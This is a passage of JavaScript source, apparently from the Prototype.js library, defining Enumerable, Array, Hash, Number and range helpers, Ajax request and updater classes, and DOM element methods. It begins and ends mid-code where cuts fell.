    iterator = iterator || Prototype.K;
    var results = [];
    this.each(function(value, index) {
      results.push(iterator.call(context, value, index));
    });
    return results;
  }

  function detect(iterator, context) {
    var result;
    this.each(function(value, index) {
      if (iterator.call(context, value, index)) {
        result = value;
        throw $break;
      }
    });
    return result;
  }

  function findAll(iterator, context) {
    var results = [];
    this.each(function(value, index) {
      if (iterator.call(context, value, index))
        results.push(value);
    });
    return results;
  }

  function grep(filter, iterator, context) {
    iterator = iterator || Prototype.K;
    var results = [];

    if (Object.isString(filter))
      filter = new RegExp(RegExp.escape(filter));

    this.each(function(value, index) {
      if (filter.match(value))
        results.push(iterator.call(context, value, index));
    });
    return results;
  }

  function include(object) {
    if (Object.isFunction(this.indexOf))
      if (this.indexOf(object) != -1) return true;

    var found = false;
    this.each(function(value) {
      if (value == object) {
        found = true;
        throw $break;
      }
    });
    return found;
  }

  function inGroupsOf(number, fillWith) {
    fillWith = Object.isUndefined(fillWith) ? null : fillWith;
    return this.eachSlice(number, function(slice) {
      while(slice.length < number) slice.push(fillWith);
      return slice;
    });
  }

  function inject(memo, iterator, context) {
    this.each(function(value, index) {
      memo = iterator.call(context, memo, value, index);
    });
    return memo;
  }

  function invoke(method) {
    var args = $A(arguments).slice(1);
    return this.map(function(value) {
      return value[method].apply(value, args);
    });
  }

  function max(iterator, context) {
    iterator = iterator || Prototype.K;
    var result;
    this.each(function(value, index) {
      value = iterator.call(context, value, index);
      if (result == null || value >= result)
        result = value;
    });
    return result;
  }

  function min(iterator, context) {
    iterator = iterator || Prototype.K;
    var result;
    this.each(function(value, index) {
      value = iterator.call(context, value, index);
      if (result == null || value < result)
        result = value;
    });
    return result;
  }

  function partition(iterator, context) {
    iterator = iterator || Prototype.K;
    var trues = [], falses = [];
    this.each(function(value, index) {
      (iterator.call(context, value, index) ?
        trues : falses).push(value);
    });
    return [trues, falses];
  }

  function pluck(property) {
    var results = [];
    this.each(function(value) {
      results.push(value[property]);
    });
    return results;
  }

  function reject(iterator, context) {
    var results = [];
    this.each(function(value, index) {
      if (!iterator.call(context, value, index))
        results.push(value);
    });
    return results;
  }

  function sortBy(iterator, context) {
    return this.map(function(value, index) {
      return {
        value: value,
        criteria: iterator.call(context, value, index)
      };
    }).sort(function(left, right) {
      var a = left.criteria, b = right.criteria;
      return a < b ? -1 : a > b ? 1 : 0;
    }).pluck('value');
  }

  function toArray() {
    return this.map();
  }

  function zip() {
    var iterator = Prototype.K, args = $A(arguments);
    if (Object.isFunction(args.last()))
      iterator = args.pop();

    var collections = [this].concat(args).map($A);
    return this.map(function(value, index) {
      return iterator(collections.pluck(index));
    });
  }

  function size() {
    return this.toArray().length;
  }

  function inspect() {
    return '#<Enumerable:' + this.toArray().inspect() + '>';
  }









  return {
    each:       each,
    eachSlice:  eachSlice,
    all:        all,
    every:      all,
    any:        any,
    some:       any,
    collect:    collect,
    map:        collect,
    detect:     detect,
    findAll:    findAll,
    select:     findAll,
    filter:     findAll,
    grep:       grep,
    include:    include,
    member:     include,
    inGroupsOf: inGroupsOf,
    inject:     inject,
    invoke:     invoke,
    max:        max,
    min:        min,
    partition:  partition,
    pluck:      pluck,
    reject:     reject,
    sortBy:     sortBy,
    toArray:    toArray,
    entries:    toArray,
    zip:        zip,
    size:       size,
    inspect:    inspect,
    find:       detect
  };
})();

function $A(iterable) {
  if (!iterable) return [];
  if ('toArray' in Object(iterable)) return iterable.toArray();
  var length = iterable.length || 0, results = new Array(length);
  while (length--) results[length] = iterable[length];
  return results;
}


function $w(string) {
  if (!Object.isString(string)) return [];
  string = string.strip();
  return string ? string.split(/\s+/) : [];
}

Array.from = $A;


(function() {
  var arrayProto = Array.prototype,
      slice = arrayProto.slice,
      _each = arrayProto.forEach; // use native browser JS 1.6 implementation if available

  function each(iterator, context) {
    for (var i = 0, length = this.length >>> 0; i < length; i++) {
      if (i in this) iterator.call(context, this[i], i, this);
    }
  }
  if (!_each) _each = each;

  function clear() {
    this.length = 0;
    return this;
  }

  function first() {
    return this[0];
  }

  function last() {
    return this[this.length - 1];
  }

  function compact() {
    return this.select(function(value) {
      return value != null;
    });
  }

  function flatten() {
    return this.inject([], function(array, value) {
      if (Object.isArray(value))
        return array.concat(value.flatten());
      array.push(value);
      return array;
    });
  }

  function without() {
    var values = slice.call(arguments, 0);
    return this.select(function(value) {
      return !values.include(value);
    });
  }

  function reverse(inline) {
    return (inline === false ? this.toArray() : this)._reverse();
  }

  function uniq(sorted) {
    return this.inject([], function(array, value, index) {
      if (0 == index || (sorted ? array.last() != value : !array.include(value)))
        array.push(value);
      return array;
    });
  }

  function intersect(array) {
    return this.uniq().findAll(function(item) {
      return array.detect(function(value) { return item === value });
    });
  }


  function clone() {
    return slice.call(this, 0);
  }

  function size() {
    return this.length;
  }

  function inspect() {
    return '[' + this.map(Object.inspect).join(', ') + ']';
  }

  function indexOf(item, i) {
    i || (i = 0);
    var length = this.length;
    if (i < 0) i = length + i;
    for (; i < length; i++)
      if (this[i] === item) return i;
    return -1;
  }

  function lastIndexOf(item, i) {
    i = isNaN(i) ? this.length : (i < 0 ? this.length + i : i) + 1;
    var n = this.slice(0, i).reverse().indexOf(item);
    return (n < 0) ? n : i - n - 1;
  }

  function concat() {
    var array = slice.call(this, 0), item;
    for (var i = 0, length = arguments.length; i < length; i++) {
      item = arguments[i];
      if (Object.isArray(item) && !('callee' in item)) {
        for (var j = 0, arrayLength = item.length; j < arrayLength; j++)
          array.push(item[j]);
      } else {
        array.push(item);
      }
    }
    return array;
  }

  Object.extend(arrayProto, Enumerable);

  if (!arrayProto._reverse)
    arrayProto._reverse = arrayProto.reverse;

  Object.extend(arrayProto, {
    _each:     _each,
    clear:     clear,
    first:     first,
    last:      last,
    compact:   compact,
    flatten:   flatten,
    without:   without,
    reverse:   reverse,
    uniq:      uniq,
    intersect: intersect,
    clone:     clone,
    toArray:   clone,
    size:      size,
    inspect:   inspect
  });

  var CONCAT_ARGUMENTS_BUGGY = (function() {
    return [].concat(arguments)[0][0] !== 1;
  })(1,2)

  if (CONCAT_ARGUMENTS_BUGGY) arrayProto.concat = concat;

  if (!arrayProto.indexOf) arrayProto.indexOf = indexOf;
  if (!arrayProto.lastIndexOf) arrayProto.lastIndexOf = lastIndexOf;
})();
function $H(object) {
  return new Hash(object);
};

var Hash = Class.create(Enumerable, (function() {
  function initialize(object) {
    this._object = Object.isHash(object) ? object.toObject() : Object.clone(object);
  }


  function _each(iterator) {
    for (var key in this._object) {
      var value = this._object[key], pair = [key, value];
      pair.key = key;
      pair.value = value;
      iterator(pair);
    }
  }

  function set(key, value) {
    return this._object[key] = value;
  }

  function get(key) {
    if (this._object[key] !== Object.prototype[key])
      return this._object[key];
  }

  function unset(key) {
    var value = this._object[key];
    delete this._object[key];
    return value;
  }

  function toObject() {
    return Object.clone(this._object);
  }



  function keys() {
    return this.pluck('key');
  }

  function values() {
    return this.pluck('value');
  }

  function index(value) {
    var match = this.detect(function(pair) {
      return pair.value === value;
    });
    return match && match.key;
  }

  function merge(object) {
    return this.clone().update(object);
  }

  function update(object) {
    return new Hash(object).inject(this, function(result, pair) {
      result.set(pair.key, pair.value);
      return result;
    });
  }

  function toQueryPair(key, value) {
    if (Object.isUndefined(value)) return key;
    return key + '=' + encodeURIComponent(String.interpret(value));
  }

  function toQueryString() {
    return this.inject([], function(results, pair) {
      var key = encodeURIComponent(pair.key), values = pair.value;

      if (values && typeof values == 'object') {
        if (Object.isArray(values)) {
          var queryValues = [];
          for (var i = 0, len = values.length, value; i < len; i++) {
            value = values[i];
            queryValues.push(toQueryPair(key, value));
          }
          return results.concat(queryValues);
        }
      } else results.push(toQueryPair(key, values));
      return results;
    }).join('&');
  }

  function inspect() {
    return '#<Hash:{' + this.map(function(pair) {
      return pair.map(Object.inspect).join(': ');
    }).join(', ') + '}>';
  }

  function clone() {
    return new Hash(this);
  }

  return {
    initialize:             initialize,
    _each:                  _each,
    set:                    set,
    get:                    get,
    unset:                  unset,
    toObject:               toObject,
    toTemplateReplacements: toObject,
    keys:                   keys,
    values:                 values,
    index:                  index,
    merge:                  merge,
    update:                 update,
    toQueryString:          toQueryString,
    inspect:                inspect,
    toJSON:                 toObject,
    clone:                  clone
  };
})());

Hash.from = $H;
Object.extend(Number.prototype, (function() {
  function toColorPart() {
    return this.toPaddedString(2, 16);
  }

  function succ() {
    return this + 1;
  }

  function times(iterator, context) {
    $R(0, this, true).each(iterator, context);
    return this;
  }

  function toPaddedString(length, radix) {
    var string = this.toString(radix || 10);
    return '0'.times(length - string.length) + string;
  }

  function abs() {
    return Math.abs(this);
  }

  function round() {
    return Math.round(this);
  }

  function ceil() {
    return Math.ceil(this);
  }

  function floor() {
    return Math.floor(this);
  }

  return {
    toColorPart:    toColorPart,
    succ:           succ,
    times:          times,
    toPaddedString: toPaddedString,
    abs:            abs,
    round:          round,
    ceil:           ceil,
    floor:          floor
  };
})());

function $R(start, end, exclusive) {
  return new ObjectRange(start, end, exclusive);
}

var ObjectRange = Class.create(Enumerable, (function() {
  function initialize(start, end, exclusive) {
    this.start = start;
    this.end = end;
    this.exclusive = exclusive;
  }

  function _each(iterator) {
    var value = this.start;
    while (this.include(value)) {
      iterator(value);
      value = value.succ();
    }
  }

  function include(value) {
    if (value < this.start)
      return false;
    if (this.exclusive)
      return value < this.end;
    return value <= this.end;
  }

  return {
    initialize: initialize,
    _each:      _each,
    include:    include
  };
})());



var Ajax = {
  getTransport: function() {
    return Try.these(
      function() {return new XMLHttpRequest()},
      function() {return new ActiveXObject('Msxml2.XMLHTTP')},
      function() {return new ActiveXObject('Microsoft.XMLHTTP')}
    ) || false;
  },

  activeRequestCount: 0
};

Ajax.Responders = {
  responders: [],

  _each: function(iterator) {
    this.responders._each(iterator);
  },

  register: function(responder) {
    if (!this.include(responder))
      this.responders.push(responder);
  },

  unregister: function(responder) {
    this.responders = this.responders.without(responder);
  },

  dispatch: function(callback, request, transport, json) {
    this.each(function(responder) {
      if (Object.isFunction(responder[callback])) {
        try {
          responder[callback].apply(responder, [request, transport, json]);
        } catch (e) { }
      }
    });
  }
};

Object.extend(Ajax.Responders, Enumerable);

Ajax.Responders.register({
  onCreate:   function() { Ajax.activeRequestCount++ },
  onComplete: function() { Ajax.activeRequestCount-- }
});
Ajax.Base = Class.create({
  initialize: function(options) {
    this.options = {
      method:       'post',
      asynchronous: true,
      contentType:  'application/x-www-form-urlencoded',
      encoding:     'UTF-8',
      parameters:   '',
      evalJSON:     true,
      evalJS:       true
    };
    Object.extend(this.options, options || { });

    this.options.method = this.options.method.toLowerCase();

    if (Object.isHash(this.options.parameters))
      this.options.parameters = this.options.parameters.toObject();
  }
});
Ajax.Request = Class.create(Ajax.Base, {
  _complete: false,

  initialize: function($super, url, options) {
    $super(options);
    this.transport = Ajax.getTransport();
    this.request(url);
  },

  request: function(url) {
    this.url = url;
    this.method = this.options.method;
    var params = Object.isString(this.options.parameters) ?
          this.options.parameters :
          Object.toQueryString(this.options.parameters);

    if (!['get', 'post'].include(this.method)) {
      params += (params ? '&' : '') + "_method=" + this.method;
      this.method = 'post';
    }

    if (params && this.method === 'get') {
      this.url += (this.url.include('?') ? '&' : '?') + params;
    }

    this.parameters = params.toQueryParams();

    try {
      var response = new Ajax.Response(this);
      if (this.options.onCreate) this.options.onCreate(response);
      Ajax.Responders.dispatch('onCreate', this, response);

      this.transport.open(this.method.toUpperCase(), this.url,
        this.options.asynchronous);

      if (this.options.asynchronous) this.respondToReadyState.bind(this).defer(1);

      this.transport.onreadystatechange = this.onStateChange.bind(this);
      this.setRequestHeaders();

      this.body = this.method == 'post' ? (this.options.postBody || params) : null;
      this.transport.send(this.body);

      /* Force Firefox to handle ready state 4 for synchronous requests */
      if (!this.options.asynchronous && this.transport.overrideMimeType)
        this.onStateChange();

    }
    catch (e) {
      this.dispatchException(e);
    }
  },

  onStateChange: function() {
    var readyState = this.transport.readyState;
    if (readyState > 1 && !((readyState == 4) && this._complete))
      this.respondToReadyState(this.transport.readyState);
  },

  setRequestHeaders: function() {
    var headers = {
      'X-Requested-With': 'XMLHttpRequest',
      'X-Prototype-Version': Prototype.Version,
      'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
    };

    if (this.method == 'post') {
      headers['Content-type'] = this.options.contentType +
        (this.options.encoding ? '; charset=' + this.options.encoding : '');

      /* Force "Connection: close" for older Mozilla browsers to work
       * around a bug where XMLHttpRequest sends an incorrect
       * Content-length header. See Mozilla Bugzilla #246651.
       */
      if (this.transport.overrideMimeType &&
          (navigator.userAgent.match(/Gecko\/(\d{4})/) || [0,2005])[1] < 2005)
            headers['Connection'] = 'close';
    }

    if (typeof this.options.requestHeaders == 'object') {
      var extras = this.options.requestHeaders;

      if (Object.isFunction(extras.push))
        for (var i = 0, length = extras.length; i < length; i += 2)
          headers[extras[i]] = extras[i+1];
      else
        $H(extras).each(function(pair) { headers[pair.key] = pair.value });
    }

    for (var name in headers)
      this.transport.setRequestHeader(name, headers[name]);
  },

  success: function() {
    var status = this.getStatus();
    return !status || (status >= 200 && status < 300) || status == 304;
  },

  getStatus: function() {
    try {
      if (this.transport.status === 1223) return 204;
      return this.transport.status || 0;
    } catch (e) { return 0 }
  },

  respondToReadyState: function(readyState) {
    var state = Ajax.Request.Events[readyState], response = new Ajax.Response(this);

    if (state == 'Complete') {
      try {
        this._complete = true;
        (this.options['on' + response.status]
         || this.options['on' + (this.success() ? 'Success' : 'Failure')]
         || Prototype.emptyFunction)(response, response.headerJSON);
      } catch (e) {
        this.dispatchException(e);
      }

      var contentType = response.getHeader('Content-type');
      if (this.options.evalJS == 'force'
          || (this.options.evalJS && this.isSameOrigin() && contentType
          && contentType.match(/^\s*(text|application)\/(x-)?(java|ecma)script(;.*)?\s*$/i)))
        this.evalResponse();
    }

    try {
      (this.options['on' + state] || Prototype.emptyFunction)(response, response.headerJSON);
      Ajax.Responders.dispatch('on' + state, this, response, response.headerJSON);
    } catch (e) {
      this.dispatchException(e);
    }

    if (state == 'Complete') {
      this.transport.onreadystatechange = Prototype.emptyFunction;
    }
  },

  isSameOrigin: function() {
    var m = this.url.match(/^\s*https?:\/\/[^\/]*/);
    return !m || (m[0] == '#{protocol}//#{domain}#{port}'.interpolate({
      protocol: location.protocol,
      domain: document.domain,
      port: location.port ? ':' + location.port : ''
    }));
  },

  getHeader: function(name) {
    try {
      return this.transport.getResponseHeader(name) || null;
    } catch (e) { return null; }
  },

  evalResponse: function() {
    try {
      return eval((this.transport.responseText || '').unfilterJSON());
    } catch (e) {
      this.dispatchException(e);
    }
  },

  dispatchException: function(exception) {
    (this.options.onException || Prototype.emptyFunction)(this, exception);
    Ajax.Responders.dispatch('onException', this, exception);
  }
});

Ajax.Request.Events =
  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete'];








Ajax.Response = Class.create({
  initialize: function(request){
    this.request = request;
    var transport  = this.transport  = request.transport,
        readyState = this.readyState = transport.readyState;

    if ((readyState > 2 && !Prototype.Browser.IE) || readyState == 4) {
      this.status       = this.getStatus();
      this.statusText   = this.getStatusText();
      this.responseText = String.interpret(transport.responseText);
      this.headerJSON   = this._getHeaderJSON();
    }

    if (readyState == 4) {
      var xml = transport.responseXML;
      this.responseXML  = Object.isUndefined(xml) ? null : xml;
      this.responseJSON = this._getResponseJSON();
    }
  },

  status:      0,

  statusText: '',

  getStatus: Ajax.Request.prototype.getStatus,

  getStatusText: function() {
    try {
      return this.transport.statusText || '';
    } catch (e) { return '' }
  },

  getHeader: Ajax.Request.prototype.getHeader,

  getAllHeaders: function() {
    try {
      return this.getAllResponseHeaders();
    } catch (e) { return null }
  },

  getResponseHeader: function(name) {
    return this.transport.getResponseHeader(name);
  },

  getAllResponseHeaders: function() {
    return this.transport.getAllResponseHeaders();
  },

  _getHeaderJSON: function() {
    var json = this.getHeader('X-JSON');
    if (!json) return null;
    json = decodeURIComponent(escape(json));
    try {
      return json.evalJSON(this.request.options.sanitizeJSON ||
        !this.request.isSameOrigin());
    } catch (e) {
      this.request.dispatchException(e);
    }
  },

  _getResponseJSON: function() {
    var options = this.request.options;
    if (!options.evalJSON || (options.evalJSON != 'force' &&
      !(this.getHeader('Content-type') || '').include('application/json')) ||
        this.responseText.blank())
          return null;
    try {
      return this.responseText.evalJSON(options.sanitizeJSON ||
        !this.request.isSameOrigin());
    } catch (e) {
      this.request.dispatchException(e);
    }
  }
});

Ajax.Updater = Class.create(Ajax.Request, {
  initialize: function($super, container, url, options) {
    this.container = {
      success: (container.success || container),
      failure: (container.failure || (container.success ? null : container))
    };

    options = Object.clone(options);
    var onComplete = options.onComplete;
    options.onComplete = (function(response, json) {
      this.updateContent(response.responseText);
      if (Object.isFunction(onComplete)) onComplete(response, json);
    }).bind(this);

    $super(url, options);
  },

  updateContent: function(responseText) {
    var receiver = this.container[this.success() ? 'success' : 'failure'],
        options = this.options;

    if (!options.evalScripts) responseText = responseText.stripScripts();

    if (receiver = $(receiver)) {
      if (options.insertion) {
        if (Object.isString(options.insertion)) {
          var insertion = { }; insertion[options.insertion] = responseText;
          receiver.insert(insertion);
        }
        else options.insertion(receiver, responseText);
      }
      else receiver.update(responseText);
    }
  }
});

Ajax.PeriodicalUpdater = Class.create(Ajax.Base, {
  initialize: function($super, container, url, options) {
    $super(options);
    this.onComplete = this.options.onComplete;

    this.frequency = (this.options.frequency || 2);
    this.decay = (this.options.decay || 1);

    this.updater = { };
    this.container = container;
    this.url = url;

    this.start();
  },

  start: function() {
    this.options.onComplete = this.updateComplete.bind(this);
    this.onTimerEvent();
  },

  stop: function() {
    this.updater.options.onComplete = undefined;
    clearTimeout(this.timer);
    (this.onComplete || Prototype.emptyFunction).apply(this, arguments);
  },

  updateComplete: function(response) {
    if (this.options.decay) {
      this.decay = (response.responseText == this.lastText ?
        this.decay * this.options.decay : 1);

      this.lastText = response.responseText;
    }
    this.timer = this.onTimerEvent.bind(this).delay(this.decay * this.frequency);
  },

  onTimerEvent: function() {
    this.updater = new Ajax.Updater(this.container, this.url, this.options);
  }
});


function $(element) {
  if (arguments.length > 1) {
    for (var i = 0, elements = [], length = arguments.length; i < length; i++)
      elements.push($(arguments[i]));
    return elements;
  }
  if (Object.isString(element))
    element = document.getElementById(element);
  return Element.extend(element);
}

if (Prototype.BrowserFeatures.XPath) {
  document._getElementsByXPath = function(expression, parentElement) {
    var results = [];
    var query = document.evaluate(expression, $(parentElement) || document,
      null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    for (var i = 0, length = query.snapshotLength; i < length; i++)
      results.push(Element.extend(query.snapshotItem(i)));
    return results;
  };
}

/*--------------------------------------------------------------------------*/

if (!Node) var Node = { };

if (!Node.ELEMENT_NODE) {
  Object.extend(Node, {
    ELEMENT_NODE: 1,
    ATTRIBUTE_NODE: 2,
    TEXT_NODE: 3,
    CDATA_SECTION_NODE: 4,
    ENTITY_REFERENCE_NODE: 5,
    ENTITY_NODE: 6,
    PROCESSING_INSTRUCTION_NODE: 7,
    COMMENT_NODE: 8,
    DOCUMENT_NODE: 9,
    DOCUMENT_TYPE_NODE: 10,
    DOCUMENT_FRAGMENT_NODE: 11,
    NOTATION_NODE: 12
  });
}



(function(global) {
  function shouldUseCache(tagName, attributes) {
    if (tagName === 'select') return false;
    if ('type' in attributes) return false;
    return true;
  }

  var HAS_EXTENDED_CREATE_ELEMENT_SYNTAX = (function(){
    try {
      var el = document.createElement('<input name="x">');
      return el.tagName.toLowerCase() === 'input' && el.name === 'x';
    }
    catch(err) {
      return false;
    }
  })();

  var element = global.Element;

  global.Element = function(tagName, attributes) {
    attributes = attributes || { };
    tagName = tagName.toLowerCase();
    var cache = Element.cache;

    if (HAS_EXTENDED_CREATE_ELEMENT_SYNTAX && attributes.name) {
      tagName = '<' + tagName + ' name="' + attributes.name + '">';
      delete attributes.name;
      return Element.writeAttribute(document.createElement(tagName), attributes);
    }

    if (!cache[tagName]) cache[tagName] = Element.extend(document.createElement(tagName));

    var node = shouldUseCache(tagName, attributes) ?
     cache[tagName].cloneNode(false) : document.createElement(tagName);

    return Element.writeAttribute(node, attributes);
  };

  Object.extend(global.Element, element || { });
  if (element) global.Element.prototype = element.prototype;

})(this);

Element.idCounter = 1;
Element.cache = { };

Element._purgeElement = function(element) {
  var uid = element._prototypeUID;
  if (uid) {
    Element.stopObserving(element);
    element._prototypeUID = void 0;
    delete Element.Storage[uid];
  }
}

Element.Methods = {
  visible: function(element) {
    return $(element).style.display != 'none';
  },

  toggle: function(element) {
    element = $(element);
    Element[Element.visible(element) ? 'hide' : 'show'](element);
    return element;
  },

  hide: function(element) {
    element = $(element);
    element.style.display = 'none';
    return element;
  },

  show: function(element) {
    element = $(element);
    element.style.display = '';
    return element;
  },

  remove: function(element) {
    element = $(element);
    element.parentNode.removeChild(element);
    return element;
  },

  update: (function(){

    var SELECT_ELEMENT_INNERHTML_BUGGY = (function(){
      var el = document.createElement("select"),
          isBuggy = true;
      el.innerHTML = "<option value=\"test\">test</option>";
      if (el.options && el.options[0]) {
        isBuggy = el.options[0].nodeName.toUpperCase() !== "OPTION";
      }
      el = null;
      return isBuggy;
    })();

    var TABLE_ELEMENT_INNERHTML_BUGGY = (function(){
      try {
        var el = document.createElement("table");
        if (el && el.tBodies) {
          el.innerHTML = "<tbody><tr><td>test</td></tr></tbody>";
          var isBuggy = typeof el.tBodies[0] == "undefined";
          el = null;
          return isBuggy;
        }
      } catch (e) {
        return true;
      }
    })();

    var LINK_ELEMENT_INNERHTML_BUGGY = (function() {
      try {
        var el = document.createElement('div');
        el.innerHTML = "<link>";
        var isBuggy = (el.childNodes.length === 0);
        el = null;
        return isBuggy;
      } catch(e) {
        return true;
      }
    })();

    var ANY_INNERHTML_BUGGY = SELECT_ELEMENT_INNERHTML_BUGGY ||
     TABLE_ELEMENT_INNERHTML_BUGGY || LINK_ELEMENT_INNERHTML_BUGGY;

    var SCRIPT_ELEMENT_REJECTS_TEXTNODE_APPENDING = (function () {
      var s = document.createElement("script"),
          isBuggy = false;
      try {
        s.appendChild(document.createTextNode(""));
        isBuggy = !s.firstChild ||
          s.firstChild && s.firstChild.nodeType !== 3;
      } catch (e) {
        isBuggy = true;
      }
      s = null;
      return isBuggy;
    })();


    function update(element, content) {
      element = $(element);
      var purgeElement = Element._purgeElement;

      var descendants = element.getElementsByTagName('*'),
       i = descendants.length;
      while (i--) purgeElement(descendants[i]);

      if (content && content.toElement)
        content = content.toElement();

      if (Object.isElement(content))
        return element.update().insert(content);

      content = Object.toHTML(content);

      var tagName = element.tagName.toUpperCase();

      if (tagName === 'SCRIPT' && SCRIPT_ELEMENT_REJECTS_TEXTNODE_APPENDING) {
        element.text = content;
        return element;
      }

      if (ANY_INNERHTML_BUGGY) {
        if (tagName in Element._insertionTranslations.tags) {
          while (element.firstChild) {
            element.removeChild(element.firstChild);
          }
          Element._getContentFromAnonymousElement(tagName, content.stripScripts())
            .each(function(node) {
              element.appendChild(node)
            });
        } else if (LINK_ELEMENT_INNERHTML_BUGGY && Object.isString(content) && content.indexOf('<link') > -1) {
          while (element.firstChild) {
            element.removeChild(element.firstChild);
          }
          var nodes = Element._getContentFromAnonymousElement(tagName, content.stripScripts(), true);
          nodes.each(function(node) { element.appendChild(node) });
        }
        else {
          element.innerHTML = content.stripScripts();
        }
      }
      else {
        element.innerHTML = content.stripScripts();
      }

      content.evalScripts.bind(content).defer();
      return element;
    }

    return update;
  })(),

  replace: function(element, content) {
    element = $(element);
    if (content && content.toElement) content = content.toElement();
    else if (!Object.isElement(content)) {
      content = Object.toHTML(content);
      var range = element.ownerDocument.createRange();
      range.selectNode(element);
      content.evalScripts.bind(content).defer();
      content = range.createContextualFragment(content.stripScripts());
    }
    element.parentNode.replaceChild(content, element);
    return element;
  },

  insert: function(element, insertions) {
    element = $(element);

    if (Object.isString(insertions) || Object.isNumber(insertions) ||
        Object.isElement(insertions) || (insertions && (insertions.toElement || insertions.toHTML)))
          insertions = {bottom:insertions};

    var content, insert, tagName, childNodes;

    for (var position in insertions) {
      content  = insertions[position];
      position = position.toLowerCase();
      insert = Element._insertionTranslations[position];

      if (content && content.toElement) content = content.toElement();
      if (Object.isElement(content)) {
        insert(element, content);
        continue;
      }

      content = Object.toHTML(content);

      tagName = ((position == 'before' || position == 'after')
        ? element.parentNode : element).tagName.toUpperCase();

      childNodes = Element._getContentFromAnonymousElement(tagName, content.stripScripts());

      if (position == 'top' || position == 'after') childNodes.reverse();
      childNodes.each(insert.curry(element));

      content.evalScripts.bind(content).defer();
    }

    return element;
  },

  wrap: function(element, wrapper, attributes) {
    element = $(element);
    if (Object.isElement(wrapper))
      $(wrapper).writeAttribute(attributes || { });
    else if (Object.isString(wrapper)) wrapper = new Element(wrapper, attributes);
    else wrapper = new Element('div', wrapper);
    if (element.parentNode)
      element.parentNode.replaceChild(wrapper, element);
    wrapper.appendChild(element);
    return wrapper;
  },

  inspect: function(element) {
    element = $(element);
    var result = '<' + element.tagName.toLowerCase();
    $H({'id': 'id', 'className': 'class'}).each(function(pair) {
      var property = pair.first(),
          attribute = pair.last(),
          value = (element[property] || '').toString();
      if (value) result += ' ' + attribute + '=' + value.inspect(true);
    });
    return result + '>';
  },

  recursivelyCollect: function(element, property, maximumLength) {
    element = $(element);
    maximumLength = maximumLength || -1;
    var elements = [];

    while (element = element[property]) {
      if (element.nodeType == 1)
        elements.push(Element.extend(element));
      if (elements.length == maximumLength)
        break;
    }

    return elements;
  },

  ancestors: function(element) {
    return Element.recursivelyCollect(element, 'parentNode');
  },

  descendants: function(element) {
    return Element.select(element, "*");
  },

  firstDescendant: function(element) {
    element = $(element).firstChild;
    while (element && element.nodeType != 1) element = element.nextSibling;
    return $(element);
  },

  immediateDescendants: function(element) {
    var results = [], child = $(element).firstChild;
    while (child) {
      if (child.nodeType === 1) {
        results.push(Element.extend(child));
      }
      child = child.nextSibling;
    }
    return results;
  },

  previousSiblings: function(element, maximumLength) {
    return Element.recursivelyCollect(element, 'previousSibling');
  },

  nextSiblings: function(element) {
    return Element.recursivelyCollect(element, 'nextSibling');
  },

  siblings: function(element) {
    element = $(element);
    return Element.previousSiblings(element).reverse()
      .concat(Element.nextSiblings(element));
  },

  match: function(element, selector) {
    element = $(element);
    if (Object.isString(selector))
      return Prototype.Selector.match(element, selector);
    return selector.match(element);
  },

  up: function(element, expression, index) {
    element = $(element);
    if (arguments.length == 1) return $(element.parentNode);
    var ancestors = Element.ancestors(element);
    return Object.isNumber(expression) ? ancestors[expression] :
      Prototype.Selector.find(ancestors, expression, index);
  },

  down: function(element, expression, index) {
    element = $(element);
    if (arguments.length == 1) return Element.firstDescendant(element);
    return Object.isNumber(expression) ? Element.descendants(element)[expression] :
      Element.select(element, expression)[index || 0];
  },

  previous: function(element, expression, index) {
    element = $(element);
    if (Object.isNumber(expression)) index = expression, expression = false;
    if (!Object.isNumber(index)) index = 0;

    if (expression) {
      return Prototype.Selector.find(element.previousSiblings(), expression, index);
    } else {
      return element.recursivelyCollect("previousSibling", index + 1)[index];
    }
  },

  next: function(element, expression, index) {
    element = $(element);
    if (Object.isNumber(expression)) index = expression, expression = false;
    if (!Object.isNumber(index)) index = 0;

    if (expression) {
      return Prototype.Selector.find(element.nextSiblings(), expression, index);
    } else {
      var maximumLength = Object.isNumber(index) ? index + 1 : 1;
      return element.recursivelyCollect("nextSibling", index + 1)[index];
    }
  },


  select: function(element) {
    element = $(element);
    var expressions = Array.prototype.slice.call(arguments, 1).join(', ');
    return Prototype.Selector.select(expressions, element);
  },

  adjacent: function(element) {
    element = $(element);
    var expressions = Array.prototype.slice.call(arguments, 1).join(', ');
    return Prototype.Selector.select(expressions, element.parentNode).without(element);
  },

  identify: function(element) {
    element = $(element);
    var id = Element.readAttribute(element, 'id');
    if (id) return id;
    do { id = 'anonymous_element_' + Element.idCounter++ } while ($(id));
    Element.writeAttribute(element, 'id', id);
    return id;
  },

  readAttribute: function(element, name) {
    element = $(element);
    if (Prototype.Browser.IE) {
      var t = Element._attributeTranslations.read;
      if (t.values[name]) return t.values[name](element, name);
      if (t.names[name]) name = t.names[name];
      if (name.include(':')) {
        return (!element.attributes || !element.attributes[name]) ? null :
         element.attributes[name].value;
      }
    }
    return element.getAttribute(name);
  },

  writeAttribute: function(element, name, value) {
    element = $(element);
    var attributes = { }, t = Element._attributeTranslations.write;

    if (typeof name == 'object') attributes = name;
    else attributes[name] = Object.isUndefined(value) ? true : value;

    for (var attr in attributes) {
      name = t.names[attr] || attr;
      value = attributes[attr];
      if (t.values[attr]) name = t.values[attr](element, value);
      if (value === false || value === null)
        element.removeAttribute(name);
      else if (value === true)
        element.setAttribute(name, name);
      else element.setAttribute(name, value);
    }
    return element;
  },

  getHeight: function(element) {
    return Element.getDimensions(element).height;
  },

  getWidth: function(element) {
    return Element.getDimensions(element).width;
  },

  classNames: function(element) {
    return new Element.ClassNames(element);
  },

  hasClassName: function(element, className) {
    if (!(element = $(element))) return;
    var elementClassName = element.className;
    return (elementClassName.length > 0 && (elementClassName == className ||
      new RegExp("(^|\\s)" + className + "(\\s|$)").test(elementClassName)));
  },

  addClassName: function(element, className) {
    if (!(element = $(element))) return;
    if (!Element.hasClassName(element, className))
      element.className += (element.className ? ' ' : '') + className;
    return element;
  },

  removeClassName: function(element, className) {
    if (!(element = $(element))) return;
    element.className = element.className.replace(
      new RegExp("(^|\\s+)" + className + "(\\s+|$)"), ' ').strip();
    return element;
  },

  toggleClassName: function(element, className) {
    if (!(element = $(element))) return;
    return Element[Element.hasClassName(element, className) ?
      'removeClassName' : 'addClassName'](element, className);
  },

  cleanWhitespace: function(element) {
    element = $(element);
    var node = element.firstChild;
    while (node) {
      var nextNode = node.nextSibling;
      if (node.nodeType == 3 && !/\S/.test(node.nodeValue))
